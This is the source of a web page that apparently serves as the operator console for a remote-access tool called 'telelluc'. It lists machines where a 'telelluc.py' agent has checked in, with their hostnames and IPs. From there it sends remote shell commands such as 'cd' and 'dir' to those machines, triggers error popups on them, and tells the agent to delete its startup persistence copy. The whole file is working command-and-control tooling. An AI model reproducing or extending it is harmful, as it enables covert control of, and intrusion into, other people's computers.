<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>telelluc</title>
    <style>
        :root {
            --bg: #000000;
            --fg: #eeeeee;
            --dim: #888888;
            --user-color: #4e9a06;
            --path-color: #3465a4;
            --error: #ff5555;
            --suggest-bg: #1a1a1a;
            --suggest-active-bg: #3465a4;
        }

        * {
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
            margin: 0;
            overflow: hidden;
            background: var(--bg);
            color: var(--fg);
            font-family: "DejaVu Sans Mono", "Cascadia Code", "Fira Code", "Consolas", "Courier New", monospace;
            font-size: clamp(12px, 2vw, 16px);
        }

        @media (max-width: 768px) {
            html, body {
                font-size: 14px;
            }
        }

        @media (max-width: 480px) {
            html, body {
                font-size: 13px;
            }
        }

        #terminal {
            height: 100vh;
            width: 100vw;
            display: flex;
            flex-direction: column;
            cursor: text;
        }

        #corner-banner {
            position: fixed;
            top: 10px;
            right: 18px;
            z-index: 10;
            margin: 0;
            font-family: "Cascadia Code", "Fira Code", "Consolas", "Courier New", monospace;
            font-size: 11px;
            font-weight: bold;
            line-height: 1.15;
            white-space: pre;
            pointer-events: none;
            user-select: none;
            background-image: linear-gradient(90deg, #ff0000, #ff9900, #ffee00, #33ff00, #00c3ff, #7700ff, #ff0000);
            background-size: 300% auto;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            animation: rainbow-move 4s linear infinite;
        }

        #corner-banner.hidden {
            display: none;
        }

        #version-badge {
            position: fixed;
            bottom: 10px;
            right: 18px;
            z-index: 10;
            font-family: "Cascadia Code", "Fira Code", "Consolas", "Courier New", monospace;
            font-size: 10px;
            color: #999999;
            pointer-events: none;
            user-select: none;
        }

        @keyframes rainbow-move {
            0% { background-position: 0% 50%; }
            100% { background-position: 300% 50%; }
        }

        #output-wrap {
            flex: 1;
            min-height: 0;
            overflow-y: auto;
            padding: clamp(10px, 3vh, 40px) clamp(10px, 3vw, 20px) 0;
            line-height: 1.45;
            -webkit-overflow-scrolling: touch;
        }

        @media (max-width: 768px) {
            #output-wrap {
                padding: 20px 12px 0;
            }
        }

        #output-wrap::-webkit-scrollbar {
            width: 10px;
        }

        #output-wrap::-webkit-scrollbar-thumb {
            background: #2a2a2a;
            border-radius: 6px;
        }

        .line {
            white-space: pre-wrap;
            word-break: break-word;
        }

        .prompt-line {
            display: flex;
            align-items: baseline;
        }

        #bottom-bar {
            position: relative;
            flex-shrink: 0;
        }

        #input-bar {
            padding: clamp(8px, 2vh, 16px) clamp(12px, 3vw, 20px) clamp(10px, 2vh, 16px);
            line-height: 1.45;
            min-height: 2.5em;
        }

        @media (max-width: 768px) {
            #input-bar {
                padding: 10px 12px 12px;
                min-height: 3em;
            }
        }

        .prompt {
            flex-shrink: 0;
            margin-right: clamp(4px, 1vw, 8px);
            word-break: break-all;
        }

        .p-user {
            color: var(--user-color);
            font-weight: bold;
        }

        .p-path {
            color: var(--path-color);
            font-weight: bold;
        }

        .p-sep {
            color: var(--fg);
        }

        .dim {
            color: var(--dim);
        }

        .error {
            color: var(--error);
        }

        #suggestions {
            display: none;
            position: absolute;
            bottom: 100%;
            left: 0;
            right: 0;
            gap: clamp(4px, 1vw, 6px);
            flex-wrap: wrap;
            padding: clamp(4px, 1vh, 6px) clamp(12px, 3vw, 20px);
            background: var(--bg);
            max-height: 30vh;
            overflow-y: auto;
            border-top: 1px solid #333;
        }

        #suggestions.visible {
            display: flex;
        }

        #suggestions .suggestion {
            background: var(--suggest-bg);
            color: var(--fg);
            padding: clamp(3px, 1vw, 10px) clamp(6px, 2vw, 12px);
            border-radius: 4px;
            font-size: 0.95em;
            cursor: pointer;
            user-select: none;
        }

        #suggestions .suggestion.active {
            background: var(--suggest-active-bg);
            color: #ffffff;
        }

        @media (max-width: 768px) {
            #suggestions .suggestion {
                padding: 6px 10px;
                min-height: 2em;
                display: flex;
                align-items: center;
            }
        }

        #input-line {
            flex: 1;
            position: relative;
            min-height: clamp(1.3em, 5vw, 2em);
            word-break: break-all;
        }

        #hidden-input {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            font-size: 16px;
        }

        #typed {
            white-space: pre-wrap;
            word-break: break-word;
        }

        .cursor {
            display: inline-block;
            width: 0.55em;
            height: 1.05em;
            background: var(--fg);
            vertical-align: text-bottom;
            animation: blink 1s steps(1) infinite;
            margin-left: 1px;
        }

        @keyframes blink {
            0%, 49% { opacity: 1; }
            50%, 100% { opacity: 0; }
        }

        @media (max-width: 768px) {
            #corner-banner {
                display: none !important;
            }

            #version-badge {
                display: none !important;
            }

            .line {
                word-break: break-word;
                overflow-wrap: break-word;
            }

            .prompt-line {
                display: flex;
                flex-wrap: wrap;
                align-items: baseline;
                gap: 4px;
            }

            #suggestions {
                max-height: 40vh;
            }
        }

        @media (max-width: 480px) {
            #corner-banner {
                font-size: 7px;
                top: 2px;
                right: 8px;
            }

            #output-wrap {
                padding: 15px 8px 0;
                font-size: 12px;
            }

            #input-bar {
                padding: 8px 8px 10px;
            }

            .line {
                font-size: 12px;
            }

            #suggestions .suggestion {
                padding: 8px 12px;
                min-height: 2.5em;
                font-size: 13px;
            }
        }

        @supports (padding: max(0px)) {
            body {
                padding-left: max(0px, env(safe-area-inset-left));
                padding-right: max(0px, env(safe-area-inset-right));
                padding-bottom: max(0px, env(safe-area-inset-bottom));
            }

            #input-bar {
                padding-bottom: max(clamp(8px, 2vh, 16px), env(safe-area-inset-bottom));
            }
        }
    </style>
</head>
<body>
    <pre id="corner-banner"> _       _      _ _
| |_ ___| | ___| | |_   _  ___
| __/ _ \ |/ _ \ | | | | |/ __|
| ||  __/ |  __/ | | |_| | (__
 \__\___|_|\___|_|_|\__,_|\___| </pre>
    <div id="version-badge">v0.0.40</div>
    <div id="terminal">
        <div id="output-wrap">
            <div id="output"></div>
        </div>
        <div id="bottom-bar">
            <div id="suggestions"></div>
            <div class="prompt-line" id="input-bar">
                <span class="prompt" id="prompt-label"></span>
                <div id="input-line"><span id="typed"></span><span class="cursor"></span></div>
            </div>
        </div>
    </div>

    <input id="hidden-input" autocomplete="off" autocapitalize="off" spellcheck="false" />

    <script>
        const terminal = document.getElementById('terminal');
        const outputWrap = document.getElementById('output-wrap');
        const output = document.getElementById('output');
        const typed = document.getElementById('typed');
        const hiddenInput = document.getElementById('hidden-input');
        const promptLabel = document.getElementById('prompt-label');
        const suggestionsBar = document.getElementById('suggestions');
        const cornerBanner = document.getElementById('corner-banner');

        const host = 'telelluc';
        const user = 'user';
        const history = [];
        let historyIndex = -1;
        let lang = 'en';
        const isMobile = window.innerWidth < 768;
        let bannerEnabled = !isMobile;
        let activeDevice = null;
        let activeDeviceHostname = null;
        let currentPath = 'C:\\';
        let controlMode = false;

        const strings = {
            en: {
                helpHeader: 'Available commands:',
                helpLines: [
                    'help              show this help',
                    'echo [text]       repeat the text',
                    'date              show the current date and time',
                    'whoami            show the current user',
                    'clear / cls       clear the screen',
                    'showbanner        toggle the rainbow "telelluc" text (top-right)',
                    'language          switch the interface language (English/Español)',
                    'error <deviceId>  trigger error popup on a device (see "devices")',
                    'rm <deviceId>     delete a device from the list',
                    'self-delete <deviceId>  remove startup copy and local copies of the agent',
                    'control <deviceId>  open interactive control session with a device',
                    'reset-id          reset device ID counter to 1',
                    'devices           list telelluc.py machines that have checked in',
                    'logout            end the session'
                ],
                notFound: (cmd) => `command not found: ${cmd}`,
                tryHelp: 'type "help" to see the available commands',
                langSwitched: 'Language set to English.',
                errorFailed: 'Could not reach telelluc.py — is it running?',
                rmFailed: 'Could not delete device.',
                devicesFailed: 'Could not load device list.',
                devicesEmpty: 'No devices have checked in yet.'
            },
            es: {
                welcome: 'Bienvenido. Escribí "help" para ver los comandos disponibles.',
                helpHeader: 'Comandos disponibles:',
                helpLines: [
                    'help              muestra esta ayuda',
                    'echo [texto]      repite el texto',
                    'date              muestra la fecha y hora actual',
                    'whoami            muestra el usuario actual',
                    'clear / cls       limpia la pantalla',
                    'showbanner        activa/desactiva el texto "telelluc" (arcoíris, arriba a la derecha)',
                    'language          cambia el idioma de la interfaz (English/Español)',
                    'error <deviceId>  dispara error en una máquina (ver "devices")',
                    'rm <deviceId>     elimina un dispositivo de la lista',
                    'self-delete <deviceId>  elimina la copia de arranque y las copias locales del agente',
                    'reset-id          reinicia el contador de IDs a 1',
                    'devices           lista las máquinas de telelluc.py que se registraron',
                    'logout            cierra la sesión'
                ],
                notFound: (cmd) => `comando no encontrado: ${cmd}`,
                tryHelp: 'escribí "help" para ver los comandos disponibles',
                langSwitched: 'Idioma cambiado a Español.',
                errorFailed: 'No se pudo contactar a telelluc.py — ¿está corriendo?',
                rmFailed: 'No se pudo eliminar el dispositivo.',
                devicesFailed: 'No se pudo cargar la lista de dispositivos.',
                devicesEmpty: 'Todavía no se registró ningún dispositivo.'
            }
        };

        function t() {
            return strings[lang];
        }

        function updatePrompt() {
            if (controlMode && activeDevice) {
                promptLabel.innerHTML =
                    `<span class="p-user">${activeDeviceHostname}</span>` +
                    `<span class="p-sep">:</span>` +
                    `<span class="p-path">${currentPath}</span>` +
                    `<span class="p-sep">$</span>`;
            } else {
                promptLabel.innerHTML =
                    `<span class="p-user">${user}@${host}</span>` +
                    `<span class="p-sep">:</span>` +
                    `<span class="p-path">~</span>` +
                    `<span class="p-sep">$</span>`;
            }
        }

        function print(text = '', className = '') {
            const div = document.createElement('div');
            div.className = 'line' + (className ? ' ' + className : '');
            div.textContent = text;
            output.appendChild(div);
        }

        function scrollToBottom() {
            outputWrap.scrollTop = outputWrap.scrollHeight;
        }

        function formatLastSeen(ms) {
            const diff = Date.now() - ms;
            if (diff < 0 || diff < 10000) return lang === 'es' ? 'ahora' : 'just now';
            const s = Math.floor(diff / 1000);
            if (s < 60) return lang === 'es' ? `hace ${s}s` : `${s}s ago`;
            const m = Math.floor(s / 60);
            if (m < 60) return lang === 'es' ? `hace ${m}m` : `${m}m ago`;
            const h = Math.floor(m / 60);
            if (h < 24) return lang === 'es' ? `hace ${h}h` : `${h}h ago`;
            const d = Math.floor(h / 24);
            return lang === 'es' ? `hace ${d}d` : `${d}d ago`;
        }

        const commands = {
            help() {
                print(t().helpHeader);
                t().helpLines.forEach((line) => print('  ' + line));
            },
            showbanner() {
                bannerEnabled = !bannerEnabled;
                cornerBanner.classList.toggle('hidden', !bannerEnabled);
            },
            echo(args) {
                print(args.join(' '));
            },
            date() {
                const now = new Date();
                print(lang === 'es' ? now.toLocaleString('es-ES') : now.toLocaleString('en-US'));
            },
            whoami() {
                print(user);
            },
            clear() {
                output.innerHTML = '';
            },
            language() {
                lang = lang === 'en' ? 'es' : 'en';
                print(t().langSwitched, 'dim');
            },
            error(args) {
                if (args.length === 0) {
                    print('Usage: error <deviceId> [amount]', 'dim');
                    print('Run "devices" to see available device IDs.', 'dim');
                    return;
                }
                
                const deviceId = args[0];
                let cantidad = 1;
                
                if (args.length >= 2) {
                    const parsed = parseInt(args[1], 10);
                    if (!isNaN(parsed) && parsed > 0) {
                        cantidad = parsed;
                    }
                }
                
                fetch('/api/error', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ deviceId, cantidad })
                }).then((resp) => {
                    if (!resp.ok) {
                        print(t().errorFailed, 'error');
                        return;
                    }
                    print('error command sent.', 'dim');
                }).catch(() => {
                    print(t().errorFailed, 'error');
                });
            },
            rm(args) {
                if (args.length === 0) {
                    print('Usage: rm <deviceId>', 'dim');
                    print('Run "devices" to see available device IDs.', 'dim');
                    return;
                }
                const deviceId = args[0];
                fetch('/api/rm', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ deviceId })
                }).then((resp) => {
                    if (!resp.ok) {
                        print(t().rmFailed, 'error');
                        return;
                    }
                    print('Device deleted.', 'dim');
                }).catch(() => {
                    print(t().rmFailed, 'error');
                });
            },
            "self-delete"(args) {
                if (args.length === 0) {
                    print('Usage: self-delete <deviceId>', 'dim');
                    print('Run "devices" to see available device IDs.', 'dim');
                    return;
                }
                const deviceId = args[0];
                fetch('/api/self-delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ deviceId })
                }).then((resp) => {
                    if (!resp.ok) {
                        print('Self-delete failed.', 'error');
                        return;
                    }
                    print('Self-delete command sent. Device will be marked offline.', 'dim');
                    setTimeout(() => {
                        print('Refreshing device list...', 'dim');
                        commands.devices([]);
                    }, 1000);
                }).catch(() => {
                    print('Self-delete failed.', 'error');
                });
            },
            devices() {
                fetch('/api/devices').then((resp) => {
                    if (!resp.ok) {
                        print(t().devicesFailed, 'error');
                        return null;
                    }
                    return resp.json();
                }).then((data) => {
                    if (!data) return;
                    if (!data.devices || data.devices.length === 0) {
                        print(t().devicesEmpty, 'dim');
                        return;
                    }
                    const rows = data.devices.map((d) => ({
                        id: '#' + d.id,
                        hostname: d.hostname,
                        status: d.online ? 'online' : 'offline',
                        lastSeen: d.online ? 'active' : formatLastSeen(d.lastSeen),
                        ip: d.ip
                    }));
                    const colWidth = (key, header) =>
                        rows.reduce((max, r) => Math.max(max, r[key].length), header.length);
                    const pad = (s, w) => s + ' '.repeat(Math.max(0, w - s.length));
                    const idW = colWidth('id', 'ID');
                    const hostW = colWidth('hostname', 'HOSTNAME');
                    const statusW = colWidth('status', 'STATUS');
                    const lastW = colWidth('lastSeen', 'LAST SEEN');
                    print(
                        pad('ID', idW) + '  ' + pad('HOSTNAME', hostW) + '  ' +
                        pad('STATUS', statusW) + '  ' + pad('LAST SEEN', lastW) + '  IP'
                    );
                    rows.forEach((r) => {
                        print(
                            pad(r.id, idW) + '  ' + pad(r.hostname, hostW) + '  ' +
                            pad(r.status, statusW) + '  ' + pad(r.lastSeen, lastW) + '  ' + r.ip
                        );
                    });
                }).catch(() => {
                    print(t().devicesFailed, 'error');
                });
            },
            control(args) {
                if (args.length === 0) {
                    print('Usage: control <deviceId>', 'dim');
                    print('Run "devices" to see available device IDs.', 'dim');
                    return;
                }
                const deviceId = args[0];
                fetch('/api/devices').then((resp) => resp.json()).then((data) => {
                    if (!data.devices) return;
                    const device = data.devices.find(d => String(d.id) === String(deviceId));
                    if (!device) {
                        print(`Device #${deviceId} not found.`, 'error');
                        return;
                    }
                    activeDevice = deviceId;
                    activeDeviceHostname = device.hostname;
                    controlMode = true;
                    currentPath = 'C:\\';
                    updatePrompt();
                    print(`Connected to ${device.hostname} (#${activeDevice}). Type "exit" to disconnect.`, 'dim');
                    print('Available commands: cd, ls, exit', 'dim');
                }).catch(() => {
                    print('Could not connect to device.', 'error');
                });
            },
            cd(args) {
                if (args.length === 0) {
                    print('Usage: cd <path>', 'dim');
                    return;
                }
                const path = args.join(' ');
                const cmd = `cd ${path}`;
                sendRemoteCommand(activeDevice, cmd, (output) => {
                    if (output && !output.toLowerCase().includes('error')) {
                        currentPath = output.trim();
                        updatePrompt();
                    } else {
                        print(output || 'Error: Cannot change directory', 'error');
                    }
                });
            },
            ls(args) {
                let cmd = 'dir';
                if (args.length > 0) {
                    cmd += ` ${args.join(' ')}`;
                }
                sendRemoteCommand(activeDevice, cmd, (output) => {
                    if (output && output.trim()) {
                        print(output.trim());
                    } else {
                        print('Directory is empty', 'dim');
                    }
                });
            },
            exit(args) {
                controlMode = false;
                activeDevice = null;
                activeDeviceHostname = null;
                currentPath = 'C:\\';
                updatePrompt();
                print('Disconnected from device.', 'dim');
            },
            "reset-id"(args) {
                fetch('/api/reset-id', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                }).then((resp) => {
                    if (!resp.ok) {
                        print('Reset failed.', 'error');
                        return;
                    }
                    return resp.json();
                }).then((data) => {
                    if (data && data.message) {
                        print(data.message, 'dim');
                        print('Next device to register will have ID #1', 'dim');
                    }
                }).catch(() => {
                    print('Reset failed.', 'error');
                });
            },
            logout() {
                window.location.href = '/logout';
            }
        };
        commands.cls = commands.clear;

        const commandNames = Object.keys(commands).sort();

        function sendRemoteCommand(deviceId, cmd, callback) {
            fetch('/api/shell', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId, payload: cmd })
            }).then((resp) => {
                if (!resp.ok) {
                    print('Command failed.', 'error');
                    return;
                }
                waitForShellResult(deviceId, callback);
            }).catch(() => {
                print('Command failed.', 'error');
            });
        }

        async function waitForShellResult(deviceId, callback, attempts = 0) {
            if (attempts > 30) {
                print('Timeout waiting for response.', 'error');
                return;
            }
            try {
                const resp = await fetch('/api/shell-result?deviceId=' + encodeURIComponent(deviceId));
                if (!resp.ok) {
                    await new Promise(r => setTimeout(r, 200));
                    waitForShellResult(deviceId, callback, attempts + 1);
                    return;
                }
                const data = await resp.json();
                if (data.result) {
                    if (callback) callback(data.result);
                } else {
                    await new Promise(r => setTimeout(r, 200));
                    waitForShellResult(deviceId, callback, attempts + 1);
                }
            } catch (e) {
                await new Promise(r => setTimeout(r, 200));
                waitForShellResult(deviceId, callback, attempts + 1);
            }
        }

        function runCommand(raw) {
            const trimmed = raw.trim();
            if (trimmed.length > 0) {
                history.push(trimmed);
            }
            historyIndex = history.length;

            const echoLine = document.createElement('div');
            echoLine.className = 'prompt-line';
            const p = document.createElement('span');
            p.className = 'prompt';
            p.innerHTML = promptLabel.innerHTML;
            echoLine.appendChild(p);
            const cmdText = document.createElement('span');
            cmdText.textContent = raw;
            echoLine.appendChild(cmdText);
            output.appendChild(echoLine);

            if (trimmed.length === 0) return;

            const [cmd, ...args] = trimmed.split(/\s+/);
            const allowedControlCommands = ['cd', 'ls', 'exit'];

            if (controlMode && !allowedControlCommands.includes(cmd.toLowerCase())) {
                print(`Command not available in control mode. Available: ${allowedControlCommands.join(', ')}`, 'error');
                return;
            }

            const fn = commands[cmd.toLowerCase()];
            if (fn) {
                fn(args);
            } else {
                print(t().notFound(cmd), 'error');
                print(t().tryHelp, 'dim');
            }
        }

        function refreshTyped() {
            typed.textContent = hiddenInput.value;
        }

        let suggestions = [];
        let suggestionIndex = 0;

        function computeSuggestions(value) {
            const v = value.toLowerCase();
            if (!v) return [];
            if (controlMode) {
                const allowedControlCommands = ['cd', 'ls', 'exit'];
                return allowedControlCommands.filter((name) => name.startsWith(v));
            }
            return commandNames.filter((name) => name.startsWith(v) && name !== 'exit');
        }

        function renderSuggestions() {
            suggestionsBar.innerHTML = '';
            if (suggestions.length === 0) {
                suggestionsBar.classList.remove('visible');
                return;
            }
            suggestions.forEach((name, i) => {
                const span = document.createElement('span');
                span.className = 'suggestion' + (i === suggestionIndex ? ' active' : '');
                span.textContent = name;
                suggestionsBar.appendChild(span);
            });
            suggestionsBar.classList.add('visible');
        }

        function updateSuggestionsFromInput() {
            suggestions = computeSuggestions(hiddenInput.value);
            suggestionIndex = 0;
            renderSuggestions();
        }

        hiddenInput.addEventListener('input', () => {
            refreshTyped();
            updateSuggestionsFromInput();
            scrollToBottom();
        });

        hiddenInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                const value = hiddenInput.value;
                hiddenInput.value = '';
                refreshTyped();
                suggestions = [];
                renderSuggestions();
                runCommand(value);
                scrollToBottom();
            } else if (e.key === 'Tab') {
                e.preventDefault();
                if (suggestions.length === 0) return;
                hiddenInput.value = suggestions[suggestionIndex];
                refreshTyped();
                updateSuggestionsFromInput();
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (suggestions.length > 0) {
                    suggestionIndex = (suggestionIndex - 1 + suggestions.length) % suggestions.length;
                    renderSuggestions();
                    return;
                }
                if (history.length === 0) return;
                historyIndex = Math.max(0, historyIndex - 1);
                hiddenInput.value = history[historyIndex] || '';
                refreshTyped();
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (suggestions.length > 0) {
                    suggestionIndex = (suggestionIndex + 1) % suggestions.length;
                    renderSuggestions();
                    return;
                }
                if (history.length === 0) return;
                historyIndex = Math.min(history.length, historyIndex + 1);
                hiddenInput.value = history[historyIndex] || '';
                refreshTyped();
            } else if (e.key === 'Escape') {
                suggestions = [];
                renderSuggestions();
            }
        });

        terminal.addEventListener('click', () => {
            hiddenInput.focus();
        });

        window.addEventListener('load', () => {
            hiddenInput.focus();
            updatePrompt();
            print(t().welcome, 'dim');
        });
    </script>
</body>
</html>
